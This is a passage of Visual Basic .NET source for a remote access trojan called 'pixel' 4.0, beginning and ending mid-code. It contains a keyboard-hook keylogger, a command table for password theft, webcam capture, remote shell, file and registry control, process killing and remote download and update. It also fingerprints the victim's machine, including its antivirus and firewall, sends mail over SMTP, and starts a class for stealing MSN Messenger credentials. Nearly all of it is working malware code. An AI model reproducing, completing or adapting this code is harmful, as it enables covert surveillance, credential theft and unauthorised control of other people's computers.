            Dim basicAuthenticationInfo As New System.Net.NetworkCredential(fromemail, pwd)
            client.Host = smpt
            client.UseDefaultCredentials = False
            client.Credentials = basicAuthenticationInfo
            client.EnableSsl = True
            client.Port = 587
            Try
                client.Send(message)
                sent = True
            Catch ex As Exception
                sent = False
            End Try
            Return sent
        End Function
    End Class
     
     
     
     
    Public Class encryption
    #Region "Encryption/Decryption"
        Dim encryptionkey As String
        Public Shared Function EncryptR(ByVal dataToEncrypt As String, ByVal password As String, ByVal salt As String) As String
            Dim rm As RijndaelManaged = Nothing
            Dim memoryStream As MemoryStream = Nothing
            Dim cryptoStream As CryptoStream = Nothing
     
            Try
                'Generate a Key based on a Password, Salt and HMACSHA1 pseudo-random number generator
                Dim rfc2898 As New Rfc2898DeriveBytes(password, Encoding.Unicode.GetBytes(salt))
     
                'Create algorithm with 256 bit key and 128-bit block size
                rm = New RijndaelManaged()
                rm.KeySize = 256
                rm.BlockSize = 128
                rm.Key = rfc2898.GetBytes(rm.KeySize / 8)
                rm.IV = rfc2898.GetBytes(rm.BlockSize / 8)
     
                'Create Memory and Crypto Streams
                memoryStream = New MemoryStream()
                cryptoStream = New CryptoStream(memoryStream, rm.CreateEncryptor(), CryptoStreamMode.Write)
     
                'Encrypt Data
                Dim data As Byte() = Encoding.Unicode.GetBytes(dataToEncrypt)
                cryptoStream.Write(data, 0, data.Length)
                cryptoStream.FlushFinalBlock()
     
                'Return Base 64 String
                Return Convert.ToBase64String(memoryStream.ToArray())
            Finally
                If cryptoStream IsNot Nothing Then
                    cryptoStream.Close()
                End If
     
                If memoryStream IsNot Nothing Then
                    memoryStream.Close()
                End If
     
                If rm IsNot Nothing Then
                    rm.Clear()
                End If
            End Try
        End Function
        Public Shared Function DecryptR(ByVal dataToDecrypt As String, ByVal password As String, ByVal salt As String) As String
            Dim rm As RijndaelManaged = Nothing
            Dim memoryStream As MemoryStream = Nothing
            Dim cryptoStream As CryptoStream = Nothing
     
            Try
                'Generate a Key based on a Password, Salt and HMACSHA1 pseudo-random number generator
                Dim rfc2898 As New Rfc2898DeriveBytes(password, Encoding.Unicode.GetBytes(salt))
     
                'Create AES algorithm with 256 bit key and 128-bit block size
                rm = New RijndaelManaged()
                rm.KeySize = 256
                rm.BlockSize = 128
                rm.Key = rfc2898.GetBytes(rm.KeySize / 8)
                rm.IV = rfc2898.GetBytes(rm.BlockSize / 8)
     
                'Create Memory and Crypto Streams
                memoryStream = New MemoryStream()
                cryptoStream = New CryptoStream(memoryStream, rm.CreateDecryptor(), CryptoStreamMode.Write)
     
                'Decrypt Data
                Dim data As Byte() = Convert.FromBase64String(dataToDecrypt)
                cryptoStream.Write(data, 0, data.Length)
                cryptoStream.FlushFinalBlock()
     
                'Return Decrypted String
                Dim decryptBytes As Byte() = memoryStream.ToArray()
                Return Encoding.Unicode.GetString(decryptBytes, 0, decryptBytes.Length)
            Finally
                If cryptoStream IsNot Nothing Then
                    cryptoStream.Close()
                End If
     
                If memoryStream IsNot Nothing Then
                    memoryStream.Close()
                End If
     
                If rm IsNot Nothing Then
                    rm.Clear()
                End If
            End Try
        End Function
        Public Shared Function getMD5Hash(ByVal strToHash As String) As String
            Dim md5Obj As New MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)
     
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
     
            Dim strResult As String = ""
     
            For Each b As Byte In bytesToHash
                strResult += b.ToString("x2")
            Next
     
            Return strResult
        End Function
        Public Function Md5Get(ByVal path As String) As String
            Dim xvpauqxdTTNhuflsjslnausqyXjtgJ As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim Data() As Byte
            Dim hash() As Byte
            Dim MrtblmRvTiqzjsqlbfGfHzWzpvudfg As String = IO.File.ReadAllText(path)
            Data = System.Text.Encoding.UTF8.GetBytes(MrtblmRvTiqzjsqlbfGfHzWzpvudfg)
            hash = xvpauqxdTTNhuflsjslnausqyXjtgJ.ComputeHash(Data)
            xvpauqxdTTNhuflsjslnausqyXjtgJ = Nothing
            Dim nzhEvMnxmovBlrLfsedqiqjlylroWv As New System.Text.StringBuilder(hash.Length)
            For i As Integer = 0 To hash.Length - 1
                nzhEvMnxmovBlrLfsedqiqjlylroWv.Append(hash(i).ToString("X2"))
            Next
            Return nzhEvMnxmovBlrLfsedqiqjlylroWv.ToString().ToLower
        End Function
        Public Function EncryptRJ256(ByVal prm_key As String, ByVal prm_iv As String, ByVal prm_text_to_encrypt As String)
     
            Dim sToEncrypt As String = prm_text_to_encrypt
     
            Dim myRijndael As New RijndaelManaged
            myRijndael.Padding = PaddingMode.Zeros
            myRijndael.Mode = CipherMode.CBC
            myRijndael.KeySize = 256
            myRijndael.BlockSize = 256
     
            Dim encrypted() As Byte
            Dim toEncrypt() As Byte
            Dim key() As Byte
            Dim IV() As Byte
     
            key = System.Text.Encoding.ASCII.GetBytes(prm_key)
            IV = System.Text.Encoding.ASCII.GetBytes(prm_iv)
     
            Dim encryptor As ICryptoTransform = myRijndael.CreateEncryptor(key, IV)
     
            Dim msEncrypt As New MemoryStream()
            Dim csEncrypt As New CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)
     
            toEncrypt = System.Text.Encoding.ASCII.GetBytes(sToEncrypt)
     
            csEncrypt.Write(toEncrypt, 0, toEncrypt.Length)
            csEncrypt.FlushFinalBlock()
     
            encrypted = msEncrypt.ToArray()
     
            Return (Convert.ToBase64String(encrypted))
     
        End Function
     
    #End Region
    End Class
     
     
     
    Public Class file64
        Public Shared Function Compress(ByVal data As Byte()) As Byte()
            Dim ms As New MemoryStream()
            Dim ds As New DeflateStream(ms, CompressionMode.Compress)
            ds.Write(data, 0, data.Length)
            ds.Flush()
            ds.Close()
            Return ms.ToArray()
        End Function
        Public Shared Function Decompress(ByVal data As Byte()) As Byte()
            Const BUFFER_SIZE As Integer = 256
            Dim tempArray As Byte() = New Byte(BUFFER_SIZE - 1) {}
            Dim tempList As New List(Of Byte())()
            Dim count As Integer = 0, length As Integer = 0
     
            Dim ms As New MemoryStream(data)
            Dim ds As New DeflateStream(ms, CompressionMode.Decompress)
     
            While (InlineAssignHelper(count, ds.Read(tempArray, 0, BUFFER_SIZE))) > 0
                If count = BUFFER_SIZE Then
                    tempList.Add(tempArray)
                    tempArray = New Byte(BUFFER_SIZE - 1) {}
                Else
                    Dim temp As Byte() = New Byte(count - 1) {}
                    Array.Copy(tempArray, 0, temp, 0, count)
                    tempList.Add(temp)
                End If
                length += count
            End While
     
            Dim retVal As Byte() = New Byte(length - 1) {}
     
            count = 0
            For Each temp As Byte() In tempList
                Array.Copy(temp, 0, retVal, count, temp.Length)
                count += temp.Length
            Next
     
            Return retVal
        End Function
        Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
            target = value
            Return value
        End Function
        Public Shared Function readfile(ByVal path As String) As String
            Try
                Dim thefile() As Byte = System.IO.File.ReadAllBytes(path)
                Dim cpressed() As Byte = Compress(thefile)
                Return Convert.ToBase64String(cpressed)
                cpressed = Nothing
                thefile = Nothing
     
            Catch
                Return "EXCEPTION"
            End Try
     
        End Function
    End Class
     
     
     
    Public Class fm
        Public Shared Function getdrives() As String
            Dim drivestring As String = String.Empty
            For Each drive As DriveInfo In DriveInfo.GetDrives()
                drivestring &= drive.Name & "#" & drive.DriveType().ToString
                'name#type#size`
                If drive.IsReady Then
                    Try
                        drivestring &= "#" & drive.TotalSize & "`"
                    Catch
                        drivestring &= "#0`"
                    End Try
     
                Else
                    drivestring &= "#0`"
                End If
            Next
            Return drivestring
        End Function
     
        Public Shared Function getfiles(ByVal path As String) As String
            MsgBox(path)
            Try
                'DIR|folder#folder#folder#`file~size#`file~size#
                Dim dirstring As String = "DIR|"
                For Each directory As String In System.IO.Directory.GetDirectories(Dir)
     
     
                    dirstring &= New DirectoryInfo(directory).Name.ToString & "#"
                Next
                dirstring &= "`"
                For Each file As String In System.IO.Directory.GetFiles(Dir)
                    Dim thefile As New FileInfo(file)
     
     
     
                    dirstring &= thefile.Name & "~" & thefile.Length & "#"
     
                Next
                Return (dirstring)
            Catch
                Return ("FERROR|")
            End Try
     
        End Function
     
        Sub runfile(ByVal file As String)
            Try
                Process.Start(file)
                Client.senddata("RUNF|S|" & file)
            Catch ex As Exception
                Client.senddata("RUNF|X|" & file)
            End Try
        End Sub
        Sub renamefile(ByVal path As String, ByVal newname As String, ByVal type As String)
            Select Case type.ToLower
                Case "file"
     
                    Try
                        findandkill(path)
                    Catch
                    End Try
                    Try
                        My.Computer.FileSystem.RenameFile(path, newname)
                        Client.senddata("REN|S|" & path & "|" & newname)
                    Catch ex As Exception
                        Client.senddata("REN|X" & path & "|" & newname)
                    End Try
                Case "folder"
     
                    Try
                        My.Computer.FileSystem.RenameDirectory(path, newname)
                        Client.senddata("REN|S" & path & "|" & newname)
                    Catch ex As Exception
                        Client.senddata("REN|X" & path & "|" & newname)
                    End Try
            End Select
     
        End Sub
        Sub deletefile(ByVal path As String)
            Try
                findandkill(path)
            Catch
            End Try
            Try
                System.IO.File.Delete(path)
                Client.senddata("DELFILE|S|" & path)
            Catch
                Client.senddata("DELFILE|X|" & path)
            End Try
     
     
        End Sub
     
     
        Public Function FileInUse(ByVal sFile As String) As Boolean
            If System.IO.File.Exists(sFile) Then
                Try
                    Dim F As Short = FreeFile()
                    FileOpen(F, sFile, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.LockReadWrite)
                    FileClose(F)
                Catch
                    Return True
                End Try
            End If
        End Function
        Public Sub findandkill(ByVal filenamer As String)
     
            If FileInUse(filenamer) = True Then
     
                For Each prc As Process In System.Diagnostics.Process.GetProcesses
                    Try
                        Dim query As String = String.Format("select * from Win32_Process where name='{0}.exe'", prc.ProcessName)
                        Dim searcher As New ManagementObjectSearcher("root\CIMV2", query)
                        Dim result = searcher.Get().GetEnumerator()
                        If Not result.MoveNext() Then Throw New ArgumentException("Process not found")
                        Dim resultpath As String = CStr(result.Current("ExecutablePath")).Trim.ToLower.Replace(" ", "_")
                        Dim finalpathstring As String = filenamer.Trim.ToLower.Replace(" ", "_")
                        If resultpath = finalpathstring Then
                            Try
                                prc.Kill()
                            Catch
                            End Try
                        End If
                    Catch
                    End Try
                Next
            End If
        End Sub
    End Class
     
     
    Public Class Getcn
        <DllImport("kernel32.dll")> _
        Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
        End Function
     
        Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
        Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002
        Public Const LOCALE_SISO3166CTRYNAME As UInteger = &H5A
     
        Private Shared Function GetInfo(ByVal lInfo As UInteger) As String
            Dim lpLCData = New System.Text.StringBuilder(256)
            Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, lpLCData, lpLCData.Capacity)
            If ret > 0 Then
                Return lpLCData.ToString().Substring(0, ret - 1)
            End If
            Return String.Empty
        End Function
        Public Shared Function GETLETTERS()
            Dim MyCountry As String = (GetInfo(LOCALE_SENGCOUNTRY))
            Return MyCountry
        End Function
        Public Shared Function Getcode()
            Dim MyCountry As String = (GetInfo(LOCALE_SISO3166CTRYNAME))
            Return MyCountry
        End Function
    End Class
     
     
    Friend Class InstanceUnique
        Implements IDisposable
        Private ReadOnly mMutex As Mutex
        Private _mMutexOwned As Boolean
     
        Public Sub New(ByVal name As String)
            mMutex = New Mutex(False, name)
            _mMutexOwned = False
        End Sub
     
        Public Function IsRunning() As Boolean
            _mMutexOwned = mMutex.WaitOne(0, True)
            Return Not (_mMutexOwned)
        End Function
     
        Public Sub Dispose() Implements IDisposable.Dispose
            If _mMutexOwned Then
                mMutex.ReleaseMutex()
            End If
        End Sub
    End Class
    Public Class Keyboard
     
        Private KeyboardHandle As IntPtr = 0 'Handle of the hook
        Private LastCheckedForegroundTitle As String = "" 'Title of the foreground window when last checked
     
     
        Private KeyLog As String 'Variable which holds the text to be appended to the text file
     
        ''' <summary>
        ''' Gets the title of the active window
     
        Private Function GetActiveWindowTitle() As String
            Dim MyStr As String
            MyStr = New String(Chr(0), 100)
            GetWindowText(GetForegroundWindow, MyStr, 100)
            MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
     
            Return MyStr
        End Function
        'Other API functions
        Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
        Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
        Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
        Private Declare Function CallNextHookEx Lib "user32" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KeyStructure) As Integer
        Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
        Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
        Public Shared Event Down(ByVal Key As String)
        Public Shared Event Up(ByVal Key As String)
        Private Shared Key As Integer
        Private Shared KHD As KDel
        Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
        Public Sub CreateHook()
            KHD = New KDel(AddressOf Proc)
            Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetEntryAssembly.GetModules()(0)).ToInt32, 0)
        End Sub
     
        Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
            If (Code = 0) Then
                Select Case wParam
                    Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
                    Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
                End Select
            End If
            Return CallNextHookEx(Key, Code, wParam, lParam)
        End Function
        Public Sub DiposeHook()
            UnhookWindowsHookEx(Key)
            MyBase.Finalize()
        End Sub
        Private Function Feed(ByVal e As Keys) As String
            Dim CurrentTitle = GetActiveWindowTitle()
     
            'If title of the foreground window changed
            If CurrentTitle <> LastCheckedForegroundTitle Then
                LastCheckedForegroundTitle = CurrentTitle
                'Add a little header containing the application title and date
                '      Client.sendcurrlog()
                Return "<ptitle>" & CurrentTitle & "<o>" & Now.ToString() & "</ptitle>"
                ' Return vbCrLf & "============ [  " & CurrentTitle & " (" & Now.ToString() & ") ]  ===============" & vbCrLf & vbCrLf
     
     
     
     
            End If
     
            Select Case e
                Case 65 To 90
                    If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
                        Return e.ToString
                    Else
                        Return e.ToString.ToLower
                    End If
                Case 48 To 57
                    If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                        Select Case e.ToString
                            Case "D1" : Return "!"
                            Case "D2" : Return """"
                            Case "D3" : Return "#"
                            Case "D4" : Return "$"
                            Case "D5" : Return "%"
                            Case "D6" : Return "^"
                            Case "D7" : Return "&"
                            Case "D8" : Return "*"
                            Case "D9" : Return "("
                            Case "D0" : Return ")"
                        End Select
                    Else
                        Return e.ToString.Replace("D", Nothing)
                    End If
                Case 96 To 105
                    Return e.ToString.Replace("NumPad", Nothing)
                Case 106 To 111
                    Select Case e.ToString
                        Case "Divide" : Return "/"
                        Case "Multiply" : Return "*"
                        Case "Subtract" : Return "-"
                        Case "Add" : Return "+"
                        Case "Decimal" : Return "."
                    End Select
                Case 32
                    Return " "
                Case 186 To 222
                    If (Control.ModifierKeys And Keys.Shift) <> 0 Then
                        Select Case e.ToString
                            Case "OemMinus" : Return "_"
                            Case "Oemplus" : Return "+"
                            Case "OemOpenBrackets" : Return "{"
                            Case "Oem6" : Return "}"
                            Case "Oem5" : Return "|"
                            Case "Oem1" : Return ":"
                            Case "Oem7" : Return "~"
                            Case "Oemcomma" : Return "<"
                            Case "OemPeriod" : Return ">"
                            Case "OemQuestion" : Return "?"
                            Case "Oemtilde" : Return "@"
                        End Select
                    Else
                        Select Case e.ToString
                            Case "OemMinus" : Return "-"
                            Case "Oemplus" : Return "="
                            Case "OemOpenBrackets" : Return "["
                            Case "Oem6" : Return "]"
                            Case "Oem5" : Return "\"
                            Case "Oem1" : Return ";"
                            Case "Oem7" : Return "'"
                            Case "Oemcomma" : Return ","
                            Case "OemPeriod" : Return "."
                            Case "OemQuestion" : Return "/"
                            Case "Oemtilde" : Return "`"
                        End Select
                    End If
                Case Keys.Enter
                    Return "[/ENTER/]"
     
                Case Keys.Return
                    Return "[/ENTER/]"
                Case Keys.Back
                    Return "[<--]"
                Case Else
     
            End Select
            Return Nothing
        End Function
    End Class
     
     
     
    Public Class logindetails
        Public Shared name As String = "pixel"
        Public Shared version As String = "4.0"
        Private Shared Function status() As String
            Return "Connection Established"
        End Function
        Public Shared Function info() As String
            Dim cname As String = sysinfo.countryname
            Dim ccode As String = "NA"
            Try
                ccode = sysinfo.countrycode()
            Catch ex As Exception
     
            End Try
     
            If ccode.Trim = "" Then
                ccode = "NA"
            End If
            Dim theid As String = sysinfo.ID
            Dim thename As String = name
            Dim user As String = sysinfo.username
            Dim machine As String = sysinfo.machinename
            Dim os As String = sysinfo.DetectOS
            Dim cstatus As String = status()
            Dim cpu As String = sysinfo.CPU
            Dim ram As String = sysinfo.ram
            Dim antivir As String = sysinfo.AntiVirus
            Dim firewall As String = sysinfo.Firewall
            Dim awindow As String = sysinfo.acwin
            Dim ping As String = sysinfo.ping
            Dim cversion As String = version
            Return "LOGIN" & "|" & cname & "#" & ccode & "|" & c.identification & theid & "|" & "#!#" & "|" & thename & "|" & user & "|" & machine _
                & "|" & os & "|" & cstatus & "|" & cpu & "|" & ram & "|" & antivir & "|" & firewall & "|" & _
                awindow & "|" & ping & "|" & cversion & "|" & c.pwd
        End Function
    End Class
     
    Public Class m
     
     
     
        Public Shared dc As String = "DIE|"
        Public Shared startrc As String = "IMG|"
     
        Public Shared startwcam As String = "WC|"
        Public Shared getthumb As String = "GT|"
     
     
        Public Shared getpass As String = "GETPASS|"
        Public Shared chatalert As String = "CHALERT|"
        Public Shared chatmsg As String = "CHMSG|"
        Public Shared proc As String = "PROC|"
        Public Shared prockill As String = "PKILL|"
        Public Shared procinfo As String = "PINFO|"
        Public Shared messagebox As String = "MSGB|"
        Public Shared frontwindow As String = "ACTWIN|"
        Public Shared uninstall As String = "UNSTL|"
        '''''''''''''''''''''''''''''''''''''''''''''''''
        'first info
        '''''''''''''''''''''''''''''''''''''''''''''''''
        Public Shared getsysinfo As String = "INFOSYS|"
        Public Shared getclientinfo As String = "INFOCLI|"
     
     
        ''''''''''''''''''''''''''''''''''''''''''''''''''
        'file manager
        ''''''''''''''''''''''''''''''''''''''''''''''''''
        Public Shared loaddrives As String = "FDRIVES|"
     
        Public Shared fmstart As String = "FMGR|"
        Public Shared folder As String = "FLDR|"
        Public Shared customdir As String = "CDIR|"
        Public Shared deletefile As String = "DELF|"
        Public Shared renamefile As String = "RENF|"
        Public Shared runfile As String = "RUNF|"
        Public Shared getfilethumbs As String = "GFT|"
        '''''''''''''''''''''''''''''''''''''''''''''''''
        'system functions
        '''''''''''''''''''''''''''''''''''''''''''''''''
        Public Shared logoff As String = "SYS|LOGOFF|"
        Public Shared shutdown As String = "SYS|SHUTDOWN|"
        Public Shared restart As String = "SYS|RESTART|"
        Public Shared opendrive As String = "SYS|OPENCD|"
        Public Shared closedrive As String = "SYS|CLOSECD|"
        Public Shared enablemouse As String = "SYS|EMOUSE|"
        Public Shared disablemouse As String = "SYS|DMOUSE|"
        Public Shared dlurl As String = "DLURL|"
        Public Shared txttospeech As String = "TXT2SPEECH|"
     
     
        '''''''''''''''''''''''''''''''''''''''''''''''''''
        'clientupdate
        '''''''''''''''''''''''''''''''''''''''''''''''''''
     
        Public Shared updateurl As String = "UPDU|"
     
        Public Shared updatelocalstart As String = "UPDLS|"
        Public Shared updatelocalpart As String = "UPDLP|"
        Public Shared updatelocalfinish As String = "UPDLF|"
        Public Shared updatelocalwhole As String = "UPDLW|"
        '''''''''''''''''''''''''''''''''''''''''''''''''''
        'cmd functions
        '''''''''''''''''''''''''''''''''''''''''''''''''''
     
        Public Shared cmdstart As String = "CMDS|"
        Public Shared cmdwrite As String = "CMDW|"
        Public Shared cmdfinish As String = "CMDF|"
     
     
        ''''''''''''''''''''''''''''''''''''''''''''''''''
        'keylog functions
        '''''''''''''''''''''''''''''''''''''''''''''''''
     
        Public Shared keylogstart As String = "KLOGS|"
        Public Shared keylogstop As String = "KLOGF|"
     
     
        ''''''''''''''''''''''''''''''''''''''''''''''''
        'scripting functions
        '''''''''''''''''''''''''''''''''''''''''''''''
        Public Shared startscript As String = "SCRIPT|S|"
        Public Shared scriptpart As String = "SCRIPT|P|"
     
        Public Shared hscript As String = "SCRIPT|H|"
        Public Shared vscript As String = "SCRIPT|V|"
        Public Shared bscript As String = "SCRIPT|B|"
     
     
        ''''''''''''''''''''''''''''''''''''''''''''''''''
        'thumbnails
        ''''''''''''''''''''''''''''''''''''''''''''''''''
        Public Shared startthumbs As String = "BTH|1"
        Public Shared stopthumbs As String = "BTH|0"
     
        ''''''''''''''''''''''''''''''''''''''''''''''
        'misc
        '''''''''''''''''''''''''''''''''''''''''''
        Public Shared site As String = "ST|"
     
        ''''''''''''''''''''''''''''''''''''''''''
        'registry
        ''''''''''''''''''''''''''''''''''''''''''
     
        Public Shared startreg As String = "REGS|"
        Public Shared reghive As String = "REGH|"
        Public Shared regkey As String = "REGK|"
        Public Shared deleteregkey As String = "REGD|"
        ''''''''''''''''''''''''''''''''''''''''''
        'appinfo
        '''''''''''''''''''''''''''''''''''''''''''
        Public Shared appinfo As String = "APFO|"
        Public Shared deletestartup As String = "DELS|"
        Public Shared deletekey As String = "DELK|"
     
     
    End Class
     
     
     
    Public Class machinedetails
        Public Shared Function getram()
            Dim totalRAM As String = (My.Computer.Info.TotalPhysicalMemory.ToString / 1000000)
            Dim Ram As String()
            If totalRAM.Contains(",") Then
                Ram = totalRAM.Split(",")
            Else
                Ram = totalRAM.Split(".")
            End If
     
            Return Ram(0)
        End Function
        Public Shared Function getcpu()
            Dim m_LM As RegistryKey
            Dim m_HW As RegistryKey
            Dim m_Des As RegistryKey
            Dim m_System As RegistryKey
            Dim m_CPU As RegistryKey
            Dim m_Info As RegistryKey
            m_LM = Registry.LocalMachine
            m_HW = m_LM.OpenSubKey("HARDWARE")
            m_Des = m_HW.OpenSubKey("DESCRIPTION")
            m_System = m_Des.OpenSubKey("SYSTEM")
            m_CPU = m_System.OpenSubKey("CentralProcessor")
            m_Info = m_CPU.OpenSubKey("0")
            Return m_Info.GetValue("ProcessorNameString") & " " & m_Info.GetValue("~Mhz") & "MHz"
     
        End Function
        Public Shared Function machindets() As String
            Dim ram As String = getram()
            Dim ctry As String = Getcn.GETLETTERS
            Dim systemos As String = sysinfo.DetectOS
            Dim systemname As String = Environment.UserName.ToString & " / " & Environment.MachineName.ToString
     
            Dim cpu As String = getcpu()
     
            Dim h As System.Net.IPHostEntry = System.Net.Dns.GetHostByName(System.Net.Dns.GetHostName)
     
            Dim lanip As String = h.AddressList.GetValue(0).ToString
     
            Dim sysmanufacturer As String = "N/A"
            Dim sysmodel As String = "N/A"
            Dim objOS As ManagementObjectSearcher
            Dim objCS As ManagementObjectSearcher
     
     
            Try
                objOS = New ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem")
                For Each objMgmt As System.Management.ManagementBaseObject In objOS.Get
     
                    sysmanufacturer = objMgmt("manufacturer").ToString()
                Next
            Catch
                sysmodel = "N/A"
            End Try
     
            Try
                objCS = New ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem")
                For Each objMgmt As System.Management.ManagementBaseObject In objCS.Get
     
                    sysmodel = objMgmt("model").ToString()
     
                Next
            Catch ex As Exception
                sysmodel = "N/A"
            End Try
         
     
     
     
     
     
            Dim hdd As String = GetTotalSpace("C:\")
            Dim windir As String = Environment.SystemDirectory
            Dim mac As String = GetMACAddress()
            Dim volumeserial As String = GetVolumeSerial()
            Dim architecture As String
            If IntPtr.Size.ToString = 8 Then
                architecture = "64"
            Else
                architecture = "32"
            End If
            Dim FULLWINDIR() As String = windir.Split("\")
     
            Return architecture & "|" & sysmanufacturer & "|" & sysmodel & "|" & hdd & "|" & windir & "|" & mac & "|" & volumeserial & "|" & lanip
     
        End Function
        Private Declare Function GetDiskFreeSpaceEx _
          Lib "kernel32" _
          Alias "GetDiskFreeSpaceExA" _
          (ByVal lpDirectoryName As String, _
          ByRef lpFreeBytesAvailableToCaller As Long, _
          ByRef lpTotalNumberOfBytes As Long, _
          ByRef lpTotalNumberOfFreeBytes As Long) As Long
        Public Shared Function GetTotalSpace(ByVal Drive As String) As String
            'returns total space in MB, formatted to two decimal places
            'e.g., msgbox("Free Space on C: "& GetTotalSpace("C:\") & "MB")
     
            Dim lBytesTotal, lFreeBytes, lFreeBytesAvailable As Long
     
            Dim iAns As Long
     
            iAns = GetDiskFreeSpaceEx(Drive, lFreeBytesAvailable, _
                 lBytesTotal, lFreeBytes)
            If iAns > 0 Then
     
                Return BytesToMegabytes(lBytesTotal)
            Else
                Throw New Exception("Invalid or unreadable drive")
            End If
        End Function
     
        Private Shared Function BytesToMegabytes(ByVal Bytes As Long) _
        As Long
     
     
            Dim dblAns As Double
            dblAns = (Bytes / 1024) / 1024
            BytesToMegabytes = Format(dblAns, "###,###,##0.00")
     
        End Function
        Public Shared Function GetMACAddress() As String
            Try
                Dim mc As ManagementClass = New ManagementClass("Win32_NetworkAdapterConfiguration")
                Dim moc As ManagementObjectCollection = mc.GetInstances()
                Dim MACAddress As String = String.Empty
                For Each mo As ManagementObject In moc
     
                    If (MACAddress.Equals(String.Empty)) Then
                        If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
     
                        mo.Dispose()
                    End If
                    MACAddress = MACAddress.Replace(":", String.Empty)
     
                Next
                Return MACAddress
            Catch
                Return "N/A"
            End Try
     
        End Function
        Public Shared Function GetVolumeSerial(Optional ByVal strDriveLetter As String = "C") As String
            Try
                Dim disk As ManagementObject = New ManagementObject(String.Format("win32_logicaldisk.deviceid=""{0}:""", strDriveLetter))
                disk.Get()
                Return disk("VolumeSerialNumber").ToString()
            Catch
                Return "N/A"
            End Try
     
        End Function
    End Class
     
     
    Friend Class CMSNMessengerPasswords
        Inherits CUtils
        Implements IEnumerable(Of CMSNMessengerPassword)
     
        'mot de passe de MSN Messenger
        'il y a plein de versions :
        'MSN ~5.0 :
        ' -> login : HKCU\Software\Microsoft\MessengerService\UserMSN Messenger Service
        ' -> mot de passe en base64 : HKCU\Software\Microsoft\MessengerService\PasswordMSN Messenger Service
        'MSN ~6.0 - ~7.0 :
        ' -> login : HKCU\Software\Microsoft\MSNMessenger\User.Net Messenger Service
        ' -> mot de passe crypté CryptProtectData et en base64 : HKCU\Software\Microsoft\MSNMessenger\Password.Net Messenger Service
        'MSN ~ > 7.0 :
        ' -> login : nom du jeton de sécurité
        ' -> mot de passe crypté : dans les données du jeton de sécurité
        'MSN ~7.5 : msidcrl.dll dans le registre
     
        'type de credentials
        Private Enum CRED_TYPE
            GENERIC = 1
            DOMAIN_PASSWORD
            DOMAIN_CERTIFICATE
            DOMAIN_VISIBLE_PASSWORD
            MAXIMUM
        End Enum
     
        'appel réussi
        Private Const ERROR_SUCCESS As Integer = 0
     
        'clé CURRENT_USER
        Private Const HKEY_CURRENT_USER As Integer = &H80000001
     
        Private Const READ_CONTROL As Integer = &H20000
        Private Const STANDARD_RIGHTS_READ As Integer = (READ_CONTROL)
        Private Const KEY_QUERY_VALUE As Integer = &H1S
        Private Const KEY_ENUMERATE_SUB_KEYS As Integer = &H8S
        Private Const KEY_NOTIFY As Integer = &H10S
        Private Const SYNCHRONIZE As Integer = &H100000
        Private Const STANDARD_RIGHTS_WRITE As Integer = (READ_CONTROL)
        Private Const KEY_SET_VALUE As Integer = &H2S
        Private Const KEY_CREATE_SUB_KEY As Integer = &H4S
        'lecture d'une clé de registre
        Private Const KEY_READ As Integer = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
        'écriture de registre
        Private Const KEY_WRITE As Integer = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
     
        'description d'un objet binaire large
        Private Structure DATA_BLOB
            Dim cbData As Integer
            Dim pbData As Integer
        End Structure
     
        'date et heure de fichier
        Private Structure FILETIME
            Dim dwLowDateTime As Integer
            Dim dwHighDateTime As Integer
        End Structure
     
        'attribut de "jeton de sécurité"
        Private Structure CREDENTIAL_ATTRIBUTE
            Dim lpstrKeyword As Integer
            Dim dwFlags As Integer
            Dim dwValueSize As Integer
            Dim lpbValue As Integer
        End Structure
     
        '"jeton de sécurité" : une donnée confidentielle et son nom
        Private Structure CREDENTIAL
            Dim dwFlags As Integer
            Dim dwType As Integer
            Dim lpstrTargetName As Integer
            Dim lpstrComment As Integer
            Dim ftLastWritten As FILETIME
            Dim dwCredentialBlobSize As Integer
            Dim lpbCredentialBlob As Integer
            Dim dwPersist As Integer
            Dim dwAttributeCount As Integer
            Dim lpAttributes As Integer 'PCREDENTIAL_ATTRIBUTE
            Dim lpstrTargetAlias As Integer
            Dim lpUserName As Integer
        End Structure
     
